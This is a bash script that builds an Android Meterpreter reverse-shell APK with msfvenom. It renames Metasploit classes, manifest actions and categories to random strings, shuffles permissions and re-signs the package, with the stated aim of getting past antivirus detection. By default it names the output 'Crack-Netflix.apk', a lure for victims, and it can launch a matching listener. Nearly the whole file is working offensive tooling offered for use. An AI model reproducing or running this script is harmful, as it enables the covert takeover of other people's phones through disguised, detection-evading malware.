#!/bin/bash

if [[ -z $(which apktool) ]]; then
	echo -e "\e[33;5m [!] \e[0;7;33mApkTool depenency needed... downloading and moving to /usr/local/bin (ROOT PERMISSIONS NEEDED)"
	wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool
	wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.2.4.jar
	mv apktool_2.2.4.jar apktool.jar
	
	chmod +x apktool*
	sudo mv apktool* /usr/local/bin/
elif [[ -z $(which jarsigner) ]]; then
	echo -e "\e[33;5m [!] \e[0;7;33mCant find jarsigner. you must install it with apt install default-jdk ;)"
	exit
fi

usage()
{
	echo -e "\e[1;32m \n$0 is a bash script that uses simple word substitution obfuscation technique to bypass AVs detection

	Usage: $0 -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -o Output.apk

	Defaults:
		payload=android/meterpreter/reverse_tcp
		LHOST=<eth0 IP address>
		LPORT=443
		output=Crack-Netflix.apk

		Options:
		-p 		<payload>			Sets the payload to be generated by msfvenom
		-o 		<output.apk>		Sets the name of the APK created as well as the output apk file.
		-n 							Generate a new debug key before signing
		-v 							Don't mask output of commands
		-d							Leaves the temp/payload files in place for review
		-h 							Help information\n
		-H 							LHOST
		-P 							LPORT
		-N 							Aplication Main activity Name
		"
	exit
}

if [[ ($# -eq 0) ]]; then
	echo -e "\e[1;31m [!] Not sufficient parameters"
	usage
fi

PAYLOAD=
LHOST=
LPORT=
INFILE=
OUTFILE=
NAME=
VERBOSE=0
DEBUG=0
DEFAULTS=0

name1=$(cat /dev/urandom | tr -cd 'a-zA-Z0-9' | head -c $((RANDOM%20+1)) )
name2=$(cat /dev/urandom | tr -cd 'a-zA-Z0-9' | head -c $((RANDOM%20+1)) )
name3=$(cat /dev/urandom | tr -cd 'a-zA-Z0-9' | head -c $((RANDOM%20+1)) )
name4=$(cat /dev/urandom | tr -cd 'a-zA-Z0-9' | head -c $((RANDOM%20+1)) )
name5=$(cat /dev/urandom | tr -cd 'a-zA-Z0-9' | head -c $((RANDOM%20+1)) )
name6=$(cat /dev/urandom | tr -cd 'a-zA-Z0-9' | head -c $((RANDOM%20+1)) )
name7=$(cat /dev/urandom | tr -cd 'a-zA-Z0-9' | head -c $((RANDOM%20+1)) )
name8=$(cat /dev/urandom | tr -cd 'a-zA-Z0-9' | head -c $((RANDOM%20+1)) )
name9=$(cat /dev/urandom | tr -cd 'a-zA-Z0-9' | head -c $((RANDOM%20+1)) )
name10=$(cat /dev/urandom | tr -cd 'a-zA-Z0-9' | head -c $((RANDOM%20+1)) )
name11=$(cat /dev/urandom | tr -cd 'a-zA-Z0-9' | head -c $((RANDOM%20+1)) )
name12=$(cat /dev/urandom | tr -cd 'a-zA-Z0-9' | head -c $((RANDOM%20+1)) )
name13=$(cat /dev/urandom | tr -cd 'a-zA-Z0-9' | head -c $((RANDOM%20+1)) )
name14=$(cat /dev/urandom | tr -cd 'a-zA-Z0-9' | head -c $((RANDOM%20+1)) )
name15=$(cat /dev/urandom | tr -cd 'a-zA-Z0-9' | head -c $((RANDOM%20+1)) )
name16=$(cat /dev/urandom | tr -cd 'a-zA-Z0-9' | head -c $((RANDOM%20+1)) )
name17=$(cat /dev/urandom | tr -cd 'a-zA-Z0-9' | head -c $((RANDOM%20+1)) )


createListener() {
	echo -e "\n\e[0;1;34m"
	read -r -p "[-] Create listener script? [y/N] " response
	case "$response" in
	    [yY])
		echo -e "\e[1;5;34m[!] \e[0;1;34mGenerating  MSF listener script. . ."

		echo "use multi/handler" > $APKNAME.listener
		echo "set payload $PAYLOAD" >> $APKNAME.listener
		echo "set LHOST $LHOST" >> $APKNAME.listener
		echo "set LPORT $LPORT" >> $APKNAME.listener
		echo "exploit -j" >> $APKNAME.listener

		echo -e "\e[0;1;32m [-] Script created: $APKNAME.listener"
		echo -e " [-] To iniciate listener: msfconsole -r $APKNAME.listener"

		read -r -p " [-] Launch listener? [y/N] " response
		echo -e "\e[0m"
		case "$response" in
		    [yY])
			msfconsole -r $APKNAME.listener
			;;
		esac

		;;
	esac
}

verbosity() {
	if [ $VERBOSE -eq 0 ]; then
		"$@" &> /dev/null
	else
		"$@"
	fi
}

while getopts "p:o:H:P:N:ngvd" option; do
	case "$option" in
		p )
			PAYLOAD=${OPTARG}
			;;
		o )
			OUTFILE=${OPTARG}
			;;
		n )
			rm -rf ~/.android/debug.keystore &> /dev/null
			;;
		g )
			DEFAULTS=1
			;;
		v )
			VERBOSE=1
			;;
		d )
			DEBUG=1
			;;
		H )
			LHOST=${OPTARG}
			;;
		P )
			LPORT=${OPTARG}
			;;
		N )
			NAME=${OPTARG}
			;;
		* )
			usage
			;;
	esac
done
shift $((OPTIND-1))

if [ $DEFAULTS -eq 1 ]; then
	PAYLOAD="android/meterpreter/reverse_tcp"
	LHOST=$(hostname -I | awk '{print $1}')
	LPORT="443"
	OUTFILE="Crack-Netflix.apk"
	NAME=$name9
	echo -e "\n\e[34mPayload will be generated with the next values:
	\e[0mpayload=\e[1;32mandroid/meterpreter/reverse_https
	\e[0mLHOST=\e[1;32m$LHOST
	\e[0mLPORT=\e[1;32m443
	\e[0moutput=\e[1;32mCrack-Netflix.apk
	\e[0mNAME=\e[1;32m$name9\n"
fi

if [[ -z $PAYLOAD || -z $LHOST || -z $LPORT || -z $OUTFILE ]]; then
	echo -e "\e[1;31m [!] Not sufficient parameters"
	usage
fi

########################################		Payload generation		########################################
echo -e "\e[1;5;34m[!] \e[0;1;34mGenerating payload. . ."
echo -e "\e[1;34m [!] msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -o $OUTFILE"
verbosity msfvenom -p $PAYLOAD LHOST\=$LHOST LPORT\=$LPORT -o $OUTFILE



########################################		Decompile APK		########################################
if [ ! -f $OUTFILE ]; then
	echo -e "\e[1;5;31m [!] \e[0;1;7;31mPayload generation failed quiting. . ."
	exit 1
fi

echo -e "\e[1;32m [-] Payload generation sucess ;)\n"
echo -e "\e[1;5;34m[!] \e[0;1;34mDecompiling with APKTool. . ."
verbosity apktool d -f -o temp/payload $OUTFILE



########################################		Name obfuscation		########################################
echo -e "\e[1;5;33m\n[!] \e[0;1;33mObfuscating names. . ."

echo -e "\e[0;93m [!] Changing /smali/com/metasploit to /smali/com/$name1"
echo -e " [!] Changing /smali/com/$name1/stage to /smali/com/$name1/$name2"
echo -e " [!] Changing /smali/com/$name1/$name2/Payload.smali to /smali/com/$name1/$name2/$name3.smali"

mv temp/payload/smali/com/metasploit temp/payload/smali/com/$name1
mv temp/payload/smali/com/$name1/stage temp/payload/smali/com/$name1/$name2
mv temp/payload/smali/com/$name1/$name2/Payload.smali temp/payload/smali/com/$name1/$name2/$name3.smali



########################################		Virustotal flagged		########################################
echo -e " [!] Changing /smali/com/$name1/$name2/MainActivity.smali to /smali/com/$name1/$name2/$name9.smali"
echo -e " [!] Changing MainActivity to $name9 in AndroidManifest.xml"
echo -e " [!] Changing MainActivity to $name9 in /smali/com/$name1/$name2/*"
echo -e " [!] Changing MainActivity to $name9 in /res/values/strings.xml"
mv temp/payload/smali/com/$name1/$name2/MainActivity.smali temp/payload/smali/com/$name1/$name2/$name9.smali
sed -i "s/MainActivity/$name9/g" temp/payload/AndroidManifest.xml
sed -i "s/MainActivity/$name9/g" temp/payload/smali/com/$name1/$name2/*
sed -i "s/MainActivity/$name9/g" temp/payload/res/values/strings.xml



echo -e " [!] Changing /smali/com/$name1/$name2/MainService.smali to /smali/com/$name1/$name2/$name10.smali"
echo -e " [!] Changing MainService to $name10 in AndroidManifest.xml"
echo -e " [!] Changing MainService to $name10 in /smali/com/$name1/$name2/*"
mv temp/payload/smali/com/$name1/$name2/MainService.smali temp/payload/smali/com/$name1/$name2/$name10.smali
sed -i "s/MainService/$name10/g" temp/payload/AndroidManifest.xml
sed -i "s/MainService/$name10/g" temp/payload/smali/com/$name1/$name2/*



echo -e " [!] Changing /smali/com/$name1/$name2/MainBroadcastReceiver.smali to temp/payload/smali/com/$name1/$name2/$name11.smali"
echo -e " [!] Changing MainBroadcastReceiver to $name11 in /smali/com/$name1/$name2/*"
echo -e " [!] Changing MainBroadcastReceiver to $name11 in AndroidManifest.xml"
mv temp/payload/smali/com/$name1/$name2/MainBroadcastReceiver.smali temp/payload/smali/com/$name1/$name2/$name11.smali
sed -i "s/MainBroadcastReceiver/$name11/g" temp/payload/smali/com/$name1/$name2/*
sed -i "s/MainBroadcastReceiver/$name11/g" temp/payload/AndroidManifest.xml



echo -e " [!] Changing action.MAIN to action.$name12 in /smali/com/$name1/$name2/*"
echo -e " [!] Changing action.MAIN to action.$name12 in AndroidManifest.xml"
sed -i "s/action.MAIN/action.$name12/g" temp/payload/smali/com/$name1/$name2/*
sed -i "s/action.MAIN/action.$name12/g" temp/payload/AndroidManifest.xml



echo -e " [!] Changing action.VIEW to action.$name13 in AndroidManifest.xml"
sed -i "s/action.VIEW/action.$name13/g" temp/payload/AndroidManifest.xml



echo -e " [!] Changing action.BOOT_COMPLETED to action.$name14 in /smali/com/$name1/$name2/*"
echo -e " [!] Changing action.BOOT_COMPLETED to action.$name14 in AndroidManifest.xml"
sed -i "s/action.MAIN/action.$name14/g" temp/payload/smali/com/$name1/$name2/*
sed -i "s/action.BOOT_COMPLETED/action.$name14/g" temp/payload/AndroidManifest.xml



echo -e " [!] Changing category.LAUNCHER to action.$name15 in /smali/com/$name1/$name2/*"
echo -e " [!] Changing category.LAUNCHER to action.$name15 in AndroidManifest.xml"
sed -i "s/category.LAUNCHER/category.$name15/g" temp/payload/smali/com/$name1/$name2/*
sed -i "s/category.LAUNCHER/category.$name15/g" temp/payload/AndroidManifest.xml



echo -e " [!] Changing category.DEFAULT to action.$name16 in /smali/com/$name1/$name2/*"
echo -e " [!] Changing category.DEFAULT to action.$name16 in AndroidManifest.xml"
sed -i "s/category.DEFAULT/category.$name16/g" temp/payload/smali/com/$name1/$name2/*
sed -i "s/category.DEFAULT/category.$name16/g" temp/payload/AndroidManifest.xml



echo -e " [!] Changing category.BROWSABLE to action.$name17 in /smali/com/$name1/$name2/*"
echo -e " [!] Changing category.BROWSABLE to action.$name17 in AndroidManifest.xml"
sed -i "s/category.BROWSABLE/category.$name17/g" temp/payload/smali/com/$name1/$name2/*
sed -i "s/category.BROWSABLE/category.$name17/g" temp/payload/AndroidManifest.xml
########################################		Virustotal flagged		########################################


if [ -f temp/payload/smali/com/$name1/$name2/PayloadTrustManager.smali ]; then
	echo -e "\e[1;5;31m [!] \e[0;1;7;31mAn old version of the msfvenom generated payload was detected"
    exit 1
fi

APKNAME=$(echo $OUTFILE | cut -f 1 -d '.')

echo -e " [!] Changing metasploit/stage to $name1/$name2 in /smali/com/$name1/$name2/*"
echo -e " [!] Changing Payload to $name3 in /smali/com/$name1/$name2/*"
sed -i "s#/metasploit/stage#/$name1/$name2#g" temp/payload/smali/com/$name1/$name2/*
sed -i "s#Payload#$name3#g" temp/payload/smali/com/$name1/$name2/*



echo -e " [!] Changing com.metasploit.meterpreter.AndroidMeterpreter to com.$name4.$name6.$name6 in /smali/com/$name1/$name2/$name3.smali"
echo -e " [!] Changing payload to $name7 in /smali/com/$name1/$name2/$name3.smali"
echo -e " [!] Changing com.mestasploit.stage to com.$name1.$name2 in AndroidManifest.xml"
echo -e " [!] Changing mestasploit to $name8 in AndroidManifest.xml"
echo -e " [!] Changing MainActivity to $APKNAME in /res/values/strings.xml"
sed -i "s#com.metasploit.meterpreter.AndroidMeterpreter#com.$name4.$name5.$name6#" temp/payload/smali/com/$name1/$name2/$name3.smali
sed -i "s#payload#$name7#g" temp/payload/smali/com/$name1/$name2/$name3.smali
sed -i "s#com.metasploit.stage#com.$name1.$name2#" temp/payload/AndroidManifest.xml
sed -i "s#metasploit#$name8#" temp/payload/AndroidManifest.xml
sed -i "s#MainActivity#$APKNAME#" temp/payload/res/values/strings.xml



echo -e "\n\e[1;5m[!] \e[0;1;93mMixing permissions. . ."
PERMISSIONS=$(grep 'uses-permission' temp/payload/AndroidManifest.xml | sort -R)

sed -i '/uses-permission/d' temp/payload/AndroidManifest.xml
sed -i "1 a $(echo $PERMISSIONS)" temp/payload/AndroidManifest.xml


echo -e "\n\e[1;5;34m[!] \e[0;1;34mRebuilding APK. . ."
echo -e "\e[0;1;32m [-] Created package: $OUTFILE"
verbosity apktool b temp/payload -o $OUTFILE



########################################		OpenGLVersion added as an effort to evade AV		########################################
PATTERN=$(grep -c 'uses-permission' temp/payload/AndroidManifest.xml)
VERSION=$((RANDOM%3+1))
SUBVERSION=0
if [[ ! $VERSION -eq 2 ]]; then
	SUBVERSION=$((RANDOM%3))
fi

sed -i "$PATTERN a <uses-feature android:glEsVersion=\"0x000$VERSION000$SUBVERSION\"/>" temp/payload/AndroidManifest.xml
sed -i 's#feature#feature android:required="false" #g' temp/payload/AndroidManifest.xml


########################################		Name obfuscation		########################################
echo -e "\n\e[0;1;5;33m [!] \e[0;1;33mLooking for file ~/.android/debug.keystore for signing"
if [ ! -f ~/.android/debug.keystore ]; then
    echo -e " [!] Debug key not found you'll be asked to generate one. . ."
    if [ ! -d "~/.android" ]; then
      verbosity mkdir ~/.android
    fi
    keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000
fi
echo -e "\e[1;5m [!] \e[0;1;33mTrying to sign APK with debug key"

#verbosity zipalign -v 4 $OUTFILE signed.apk && mv signed.apk $OUTFILE
verbosity jarsigner -keystore ~/.android/debug.keystore -storepass  android -keypass android -digestalg SHA1 -sigalg MD5withRSA $OUTFILE androiddebugkey

echo -e "\e[0;1;32m [-] .apk file signed with ~/.android/debug.keystore"
echo -e "\e[34m [-] For new key use '-n' option"

createListener

if [ $DEBUG -ne 1 ]; then
	echo -e "\n\e[0;1;5;34m [!] \e[0;1;34mCleaning all created files ;)"
	rm -rf temp
fi


echo -e "\n\e[0;1;32m [-] smali file structure: com.$name1.$name2"
